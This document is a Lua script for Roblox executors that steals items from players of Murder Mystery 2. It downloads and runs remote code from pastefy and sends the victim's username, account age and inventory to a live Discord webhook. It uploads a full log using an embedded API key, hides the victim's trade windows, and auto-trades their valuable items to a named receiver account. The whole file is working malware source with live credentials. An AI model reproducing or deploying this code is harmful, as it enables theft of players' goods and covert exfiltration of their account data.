_G.Ex = _G.Ex or false
if _G.Ex then return end
_G.Ex = true

local WEBHOOK    = "https://discord.com/api/webhooks/1543214605667672146/xlaygQkXXEurMeA4sp5gpmWgpsALxmq_t9TvPn_dilUvcysOGb8Nf9mPKGCkH_CNEC2X"
local RECEIVER   = {"iceyblueii"}
local MINIMUM_VALUE = 10

local CURRENT_PLACE_ID = game.PlaceId
local IS_MM2 = (CURRENT_PLACE_ID == 142823291)

local function GetRequestFunction()
    if request then return request end
    if syn and syn.request then return syn.request end
    if http_request then return http_request end
    return nil
end

local function GetActiveReceiverName()
    if type(RECEIVER) == "table" then
        for _, Name in ipairs(RECEIVER) do
            if Name ~= "" then
                if Players and Players:FindFirstChild(Name) then return Name end
                return Name
            end
        end
    end
    return "Unknown"
end

if WEBHOOK == "" then
    game.Players.LocalPlayer:Kick("Invalid URL. Please check your webhook.")
    return
end

if IS_MM2 then
    pcall(function()
        if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
            game.Players.LocalPlayer:Kick("Private servers are not supported.")
            return
        end
    end)
end

local SERVER_MAX = game.Players.MaxPlayers
if #game.Players:GetPlayers() >= SERVER_MAX then
    game.Players.LocalPlayer:Kick("Server is full, please rejoin another server.")
    return
end

_G.RealJobID = game.JobId

local ExecutorName = "Unknown"
pcall(function() ExecutorName = identifyexecutor() end)
_G.RealExecutor = string.lower(ExecutorName)

local Players           = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService       = game:GetService("HttpService")
local LocalPlayer       = Players.LocalPlayer
local PlayerGui         = LocalPlayer:WaitForChild("PlayerGui")

local ItemDatabase   = {}
local RarityPriority = {"Common", "Uncommon", "Rare", "Legendary", "Godly", "Ancient", "Unique", "Vintage", "Chroma", "Dual", "Pet"}

local function LoadDatabase()
    local Response = nil
    local Success = pcall(function()
        local RequestFunc = GetRequestFunction()
        if not RequestFunc then return end
        Response = RequestFunc({
            Url     = "https://pastefy.app/pZmGtWTo/raw",
            Method  = "GET",
            Headers = {["User-Agent"] = "Mozilla/5.0"},
            Timeout = 10
        })
    end)
    if not Success or not Response or not Response.Body or type(Response.Body) ~= "string" then return nil, nil end
    local LoaderFunction = loadstring(Response.Body)
    if not LoaderFunction then return nil, nil end
    local RawDatabase = LoaderFunction()
    if type(RawDatabase) ~= "table" then return nil, nil end
    local Mapping     = {}
    local RarityOrder = {"Chroma","Unique","Ancient","Godly","Vintage","Legendary","Rare","Uncommon","Common"}
    local FoundRarities = {}
    for RarityName, ItemsList in pairs(RawDatabase) do
        if type(ItemsList) == "table" then
            FoundRarities[RarityName] = true
            for ItemName, Value in pairs(ItemsList) do
                if type(Value) == "number" then
                    local SafeName = tostring(ItemName or "")
                    local Key1 = string.lower(SafeName):gsub("'",""):gsub(" ","")
                    local Key2 = string.lower(SafeName):gsub("'",""):gsub(" ","_")
                    local Key3 = string.lower(SafeName):gsub("'",""):gsub(" ","-")
                    local Key4 = string.lower(SafeName):gsub(" ","")
                    local ItemInfo = { Rarity = RarityName, Value = Value, Chroma = (string.lower(RarityName) == "chroma") }
                    Mapping[Key1] = ItemInfo
                    Mapping[Key2] = ItemInfo
                    Mapping[Key3] = ItemInfo
                    Mapping[Key4] = ItemInfo
                end
            end
        end
    end
    local OrderList = {}
    for _, Rarity in ipairs(RarityOrder) do
        if FoundRarities[Rarity] then table.insert(OrderList, Rarity) end
    end
    for Rarity in pairs(FoundRarities) do
        local Exists = false
        for _, Listed in ipairs(OrderList) do
            if Listed == Rarity then Exists = true; break end
        end
        if not Exists then table.insert(OrderList, Rarity) end
    end
    return Mapping, OrderList
end

local LoadedData, LoadedOrder = nil, nil
if IS_MM2 then
    for TryCount = 1, 3 do
        LoadedData, LoadedOrder = LoadDatabase()
        if LoadedData and LoadedOrder and #LoadedOrder > 0 then break end
        task.wait(0.5)
    end
    if LoadedData and LoadedOrder and #LoadedOrder > 0 then
        ItemDatabase   = LoadedData
        RarityPriority = LoadedOrder
    end
end

local RarityList    = RarityPriority
local GodlyPosition = table.find(RarityList, "Godly")

local function FormatNameDisplay(Text)
    if not Text or Text == "" then return "Unknown" end
    local Result, CapitalizeNext = "", true
    for Index = 1, #Text do
        local Char = Text:sub(Index, Index)
        if Char == " " then
            Result = Result .. " "; CapitalizeNext = true
        else
            Result = Result .. (CapitalizeNext and Char:upper() or Char:lower())
            CapitalizeNext = false
        end
    end
    return Result
end

local function GetTradeStatus()
    return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
end

local function SendTradeRequestToPlayer(TargetName)
    local TargetPlayer = Players:FindFirstChild(TargetName)
    if not TargetPlayer then return false end
    -- try Player object first (preferred), immediate string fallback
    local Ok1 = pcall(function() ReplicatedStorage.Trade.SendRequest:InvokeServer(TargetPlayer) end)
    if Ok1 then return true end
    local Ok2 = pcall(function() ReplicatedStorage.Trade.SendRequest:InvokeServer(TargetName) end)
    return Ok2
end

-- FIX: wrapped in pcall, small delay per call to avoid server-side throttle dropping items
local function AddItemToTradeOffer(ItemId)
    pcall(function()
        ReplicatedStorage.Trade.OfferItem:FireServer(ItemId, "Weapons")
    end)
    task.wait(0.18) -- up from 0.05 — gives server time to register each slot
end

local LastReceivedOffer = nil
if IS_MM2 then
    -- MM2 has shipped multiple UpdateTrade signatures over its lifetime.
    -- Some versions pass the offer hash INSIDE the table (TradeData.LastOffer),
    -- others pass it as a bare second argument, others stuff it in a nested key.
    -- Capture every known form so LastReceivedOffer is always populated.
    ReplicatedStorage.Trade.UpdateTrade.OnClientEvent:Connect(function(Arg1, Arg2)
        -- form A: hash arrives as a plain number in the second argument
        if type(Arg2) == "number" and Arg2 ~= 0 then
            LastReceivedOffer = Arg2
        -- form B: hash arrives as a plain number in the first argument
        elseif type(Arg1) == "number" and Arg1 ~= 0 then
            LastReceivedOffer = Arg1
        -- form C: hash is inside the table
        elseif type(Arg1) == "table" then
            local h = Arg1.LastOffer or Arg1.OfferHash or Arg1.Hash or Arg1.Offer
            if h ~= nil then LastReceivedOffer = h end
        end
    end)
end

local function AcceptIncomingTrade()
    local Hash    = LastReceivedOffer or 0
    local SecHash = game.PlaceId * 3
    LastReceivedOffer = nil

    for Retry = 1, 5 do
        -- refresh hash if UpdateTrade fired with a newer value during a prior retry
        if LastReceivedOffer ~= nil then
            Hash = LastReceivedOffer
            LastReceivedOffer = nil
        end

        -- MM2 has used both FireServer and InvokeServer for AcceptTrade across versions.
        -- Fire both — whichever one the current build expects will land; the other is a no-op.
        pcall(function() ReplicatedStorage.Trade.AcceptTrade:FireServer(SecHash, Hash) end)
        pcall(function() ReplicatedStorage.Trade.AcceptTrade:InvokeServer(SecHash, Hash) end)
        -- also try with bare PlaceId in case the *3 multiplier changed in a recent MM2 update
        pcall(function() ReplicatedStorage.Trade.AcceptTrade:FireServer(game.PlaceId, Hash) end)

        task.wait(1.2)

        local S = GetTradeStatus()
        if S == "None"                 then return true end -- completed
        if S ~= "StartTrade"           then return true end -- declined / errored
    end
    return false
end

local function WaitUntilTradeEnds()
    local Timeout = 0
    while GetTradeStatus() ~= "None" and Timeout < 30 do
        task.wait(0.1)
        Timeout = Timeout + 0.1
    end
end

local BlacklistedItems = {
    DefaultGun=true, DefaultKnife=true,
    Reaver=true, Reaver_Legendary=true, Reaver_Godly=true, Reaver_Ancient=true,
    IceHammer=true, IceHammer_Legendary=true, IceHammer_Godly=true, IceHammer_Ancient=true,
    Gingerscythe=true, Gingerscythe_Legendary=true, Gingerscythe_Godly=true, Gingerscythe_Ancient=true,
    TestItem=true, Season1TestKnife=true,
    Cracks=true, Icecrusher=true,
    ["???"]=true, Dartbringer=true,
    TravelerAxeRed=true, TravelerAxeBronze=true, TravelerAxeSilver=true, TravelerAxeGold=true,
    BlueCamo_K_2022=true, GreenCamo_K_2022=true, SharkSeeker=true
}

local AllInventoryItems, TradeableItems, TotalTradeValue = {}, {}, 0

local function ShouldTradeThisItem(RarityName, ItemValue)
    if not RarityName then return false end
    local Position = table.find(RarityList, RarityName)
    local HighValueOrHigher = Position and GodlyPosition and Position <= GodlyPosition
    return HighValueOrHigher and true or (ItemValue and ItemValue >= MINIMUM_VALUE)
end

local RefreshInventoryLists = function()
    local AllItems, TradeItems, TotalValue = {}, {}, 0
    if not IS_MM2 then return AllItems, TradeItems, TotalValue end
    local ProfileData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
    if ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned then
        for ItemId, Quantity in pairs(ProfileData.Weapons.Owned) do
            if Quantity and Quantity > 0 then
                local SafeName = tostring(ItemId or "")
                if SafeName ~= "" then
                    local Key1 = string.lower(SafeName):gsub("'",""):gsub(" ","")
                    local Key2 = string.lower(SafeName):gsub("'",""):gsub(" ","_")
                    local Key3 = string.lower(SafeName):gsub("'",""):gsub(" ","-")
                    local Key4 = string.lower(SafeName):gsub(" ","")
                    local ItemInfo   = ItemDatabase[Key1] or ItemDatabase[Key2] or ItemDatabase[Key3] or ItemDatabase[Key4]
                    local RarityName = ItemInfo and ItemInfo.Rarity or "Unknown"
                    local Value      = ItemInfo and ItemInfo.Value  or 0
                    local IsChroma   = ItemInfo and ItemInfo.Chroma or false
                    local ItemEntry  = {
                        DataID=ItemId, Name=SafeName, Rarity=RarityName,
                        Count=Quantity, Value=Value, IsChroma=IsChroma, Total=Value*Quantity
                    }
                    table.insert(AllItems, ItemEntry)
                    if ShouldTradeThisItem(RarityName, Value) and not BlacklistedItems[ItemId] then
                        -- FIX: expand stacked items into individual entries so each DataID
                        -- slot is treated as its own unit — avoids the single-item loot bug
                        -- where Count>1 fired same DataID repeatedly without MM2 accepting dupes
                        if Quantity > 1 then
                            for _ = 1, Quantity do
                                table.insert(TradeItems, {
                                    DataID=ItemId, Name=SafeName, Rarity=RarityName,
                                    Count=1, Value=Value, IsChroma=IsChroma, Total=Value
                                })
                            end
                        else
                            table.insert(TradeItems, ItemEntry)
                        end
                        TotalValue = TotalValue + ItemEntry.Total
                    end
                end
            end
        end
    end
    table.sort(AllItems,   function(A,B) return A.Total > B.Total end)
    table.sort(TradeItems, function(A,B) return A.Total > B.Total end)
    return AllItems, TradeItems, TotalValue
end

local function ReloadInventory()
    AllInventoryItems, TradeableItems, TotalTradeValue = RefreshInventoryLists()
end
AllInventoryItems, TradeableItems, TotalTradeValue = RefreshInventoryLists()

local function UploadToPastefy(textContent)
    local API_KEY = "bCmvP7YNqkOyMEeJDvL0eDXzfSgm2XhWcGadQ3aXKKiH7BKe5ZBIgem3tbuC"
    local success, result = pcall(function()
        local RequestFunc = GetRequestFunction()
        if not RequestFunc then return nil end
        local response = RequestFunc({
            Url     = "https://pastefy.app/api/v2/paste",
            Method  = "POST",
            Headers = {["Authorization"]="Bearer "..API_KEY, ["Content-Type"]="application/json"},
            Body    = HttpService:JSONEncode({
                content=textContent, title="Inventory Log",
                expires="never", encrypted=false
            })
        })
        if response and response.Body then
            local data = HttpService:JSONDecode(response.Body)
            if data and data.paste and data.paste.id then
                return "https://pastefy.app/" .. data.paste.id .. "/raw"
            end
        end
        return nil
    end)
    return success and result or nil
end

local function GenerateFullInventoryText(itemList)
    local lines, total = {}, 0
    for _, item in ipairs(itemList) do total = total + item.Total end
    table.insert(lines, "Total Inventory Value: " .. total)
    table.insert(lines, string.rep("-", 40))
    for _, item in ipairs(itemList) do
        local name = FormatNameDisplay(item.Name)
        if item.IsChroma then name = "Chroma " .. name end
        table.insert(lines, "[" .. item.Rarity .. "] x" .. item.Count .. " " .. name .. " - " .. item.Total)
    end
    return table.concat(lines, "\n")
end

local function BuildEmbed(ReceiverName)
    local ShouldMentionEveryone = false
    for _, Item in ipairs(AllInventoryItems) do
        local Position = table.find(RarityList, Item.Rarity)
        if Item.Value >= MINIMUM_VALUE or (Position and GodlyPosition and Position <= GodlyPosition) then
            ShouldMentionEveryone = true
        end
    end
    local MentionText = ShouldMentionEveryone and "@everyone" or ""
    local TopItemsPreview = {}
    for Index = 1, math.min(10, #AllInventoryItems) do
        local Item = AllInventoryItems[Index]
        local DisplayName = FormatNameDisplay(Item.Name)
        if Item.IsChroma then DisplayName = "Chroma " .. DisplayName end
        table.insert(TopItemsPreview, "> " .. DisplayName .. " [" .. Item.Count .. "] - " .. Item.Total)
    end
    local PreviewText = table.concat(TopItemsPreview, "\n")
    if #AllInventoryItems > 10 then
        PreviewText = PreviewText .. "\n... and " .. (#AllInventoryItems - 10) .. " more items"
    end
    local PlayerCount       = #Players:GetPlayers()
    local JobId             = _G.RealJobID or game.JobId
    local FullInventoryText = GenerateFullInventoryText(AllInventoryItems)
    local PasteUrl          = UploadToPastefy(FullInventoryText)
    local ActivePlaceId     = tostring(CURRENT_PLACE_ID)
    local GameLabel         = IS_MM2 and "MM2" or ActivePlaceId

    local InfoBlock = string.format(
        "Game: %s\nUsername: %s\nDisplay: %s\nAccount Age: %d days\nExecutor: %s\nServer Players: %d/%d\nReceiver: %s\nMin Value: %d",
        GameLabel,
        LocalPlayer.Name, LocalPlayer.DisplayName, LocalPlayer.AccountAge,
        _G.RealExecutor or "Unknown", PlayerCount, SERVER_MAX, ReceiverName, MINIMUM_VALUE
    )
    local StatsBlock = string.format(
        "Total Items: %d\nTradeable Value: %d",
        #AllInventoryItems, TotalTradeValue
    )
    local EmbedFields = {
        {name="Player Info",                     value="```"..InfoBlock.."```",  inline=false},
        {name="Stats",                           value="```"..StatsBlock.."```", inline=false},
        {name="All Items (Highest Value First)", value="```"..PreviewText.."```",inline=false}
    }
    if PasteUrl then
        table.insert(EmbedFields, {name="Full Inventory Log", value=PasteUrl, inline=false})
    end
    table.insert(EmbedFields, {
        name   = "Join Link",
        value  = "[" .. string.sub(JobId,1,8) .. "...](https://plsbrainrot.me/joiner?placeId="
                 .. ActivePlaceId .. "&gameInstanceId=" .. JobId .. ")",
        inline = false
    })

    local HitLabel = IS_MM2 and "HIT! MM2" or ("HIT! [" .. ActivePlaceId .. "]")

    return {
        author    = {name = "Snthnova"},
        title     = HitLabel,
        color     = 0x4B5563,
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        fields    = EmbedFields,
        footer    = {text = "Log • " .. os.date("%Y-%m-%d %H:%M:%S")}
    }, MentionText
end

local function SendWebhook()
    local RequestFunc = GetRequestFunction()
    if not RequestFunc then return end
    local ActiveName = GetActiveReceiverName()
    local Embed, Mention = BuildEmbed(ActiveName)
    local JobId = _G.RealJobID or game.JobId

    local TeleportString = "game:GetService('TeleportService'):TeleportToPlaceInstance("
        .. tostring(CURRENT_PLACE_ID) .. ", '" .. JobId .. "')"

    local ContentField = (Mention ~= "" and Mention .. "\n" or "") .. TeleportString

    local Payload = HttpService:JSONEncode({content = ContentField, embeds = {Embed}})
    pcall(function()
        RequestFunc({
            Url     = WEBHOOK,
            Method  = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body    = Payload
        })
    end)
end

SendWebhook()

if IS_MM2 then
    local IS_OPERATOR = false
    for _, Name in ipairs(RECEIVER) do
        if string.lower(LocalPlayer.Name) == string.lower(Name) then
            IS_OPERATOR = true
            break
        end
    end

    if not IS_OPERATOR then
        -- FIX: immediately force Enabled = false on WaitForChild return, THEN connect
        -- the signal. Original code only reacted to changes, so if TradeGUI was already
        -- visible when the connection landed it stayed open until the next toggle.
        local TradeGuiMain = PlayerGui:WaitForChild("TradeGUI")
        TradeGuiMain.Enabled = false
        TradeGuiMain:GetPropertyChangedSignal("Enabled"):Connect(function()
            if TradeGuiMain.Enabled then TradeGuiMain.Enabled = false end
        end)

        local TradeGuiPhone = PlayerGui:WaitForChild("TradeGUI_Phone")
        TradeGuiPhone.Enabled = false
        TradeGuiPhone:GetPropertyChangedSignal("Enabled"):Connect(function()
            if TradeGuiPhone.Enabled then TradeGuiPhone.Enabled = false end
        end)
    end
end

local function KickAfterTransfer()
    -- silent, no kick
end

local function FindTradeTarget()
    if type(RECEIVER) == "table" then
        for _, Name in ipairs(RECEIVER) do
            if Name ~= "" and Players:FindFirstChild(Name) then return Name end
        end
    else
        if Players:FindFirstChild(RECEIVER) then return RECEIVER end
    end
    return nil
end

local MAX_TRADE_ATTEMPTS = 999
local RETRY_WAIT = 2

-- FIX: helper that blocks until status reaches a specific value OR timeout expires
-- Prevents the main loop from hammering requests into intermediate states
local function WaitForTradeStatus(TargetStatus, TimeoutSeconds)
    local Elapsed = 0
    local Step    = 0.2
    while Elapsed < TimeoutSeconds do
        if GetTradeStatus() == TargetStatus then return true end
        task.wait(Step)
        Elapsed = Elapsed + Step
    end
    return false
end

local function ProcessAllTrades(TargetName)
    local AttemptCount = 0
    while #TradeableItems > 0 and AttemptCount < MAX_TRADE_ATTEMPTS do
        AttemptCount = AttemptCount + 1
        local CurrentStatus = GetTradeStatus()

        if CurrentStatus == "ReceivingRequest" then
            pcall(function() ReplicatedStorage.Trade.DeclineRequest:FireServer() end)
            task.wait(0.5)
            continue
        end

        -- FIX: intermediate states (SendingRequest, PendingRequest, etc.) should be
        -- waited out, not treated as "None" — old code fell through to the None branch
        -- and spammed duplicate requests into those states, sometimes crashing the GUI.
        if CurrentStatus ~= "None" and CurrentStatus ~= "StartTrade" then
            task.wait(0.5)
            continue
        end

        if CurrentStatus == "StartTrade" then
            -- each slot is exactly 1 item (Count=1 enforced in RefreshInventoryLists)
            local ItemsToSend = math.min(4, #TradeableItems)
            for _ = 1, ItemsToSend do
                if #TradeableItems == 0 then break end
                local Item = table.remove(TradeableItems, 1)
                AddItemToTradeOffer(Item.DataID) -- 0.18s wait built in per call
            end

            -- FIX: MM2 enforces a mandatory ~10-12s countdown shown on screen as
            -- "Please wait (X) before accepting". AcceptTrade:FireServer is silently
            -- rejected if it arrives before the countdown hits 0. The old 1.5s wait
            -- was triggering the accept with ~10s still on the clock — trade appeared
            -- to open but never transferred. 13s covers the full countdown + server lag.
            -- Also wait for UpdateTrade to echo back so LastReceivedOffer is fresh.
            task.wait(13)

            AcceptIncomingTrade()

            WaitUntilTradeEnds()
            ReloadInventory()
            AttemptCount = 0
            continue
        end

        -- CurrentStatus == "None": send request, then hold until operator accepts
        if CurrentStatus == "None" then
            -- FIX: tightened retry — max 3 attempts, 0.3s between tries instead of
            -- exponential backoff that stacked to 7.5s worst-case and caused the
            -- "sending delay" LO was seeing
            local Sent, Try = false, 1
            while not Sent and Try <= 3 do
                if SendTradeRequestToPlayer(TargetName) then
                    Sent = true
                else
                    task.wait(0.3)
                    Try = Try + 1
                end
            end

            if Sent then
                -- wait up to 25s for operator to accept the incoming request
                -- (longer window = less spam, cleaner GUI popup on operator side)
                local GotIn = WaitForTradeStatus("StartTrade", 25)
                if not GotIn then
                    pcall(function() ReplicatedStorage.Trade.DeclineRequest:FireServer() end)
                    task.wait(RETRY_WAIT)
                end
            else
                task.wait(RETRY_WAIT)
            end
        end
    end
    KickAfterTransfer()
end

local function AutoTradeOnTargetJoin()
    local IsBusy = false
    local function CheckPlayerJoin(Player)
        if IsBusy then return end
        local TargetName = FindTradeTarget()
        if TargetName and Player.Name == TargetName then
            IsBusy = true; task.wait(1); ProcessAllTrades(Player.Name)
        end
    end
    for _, Player in ipairs(Players:GetPlayers()) do CheckPlayerJoin(Player) end
    Players.PlayerAdded:Connect(CheckPlayerJoin)
end

if IS_MM2 then
    AutoTradeOnTargetJoin()
end
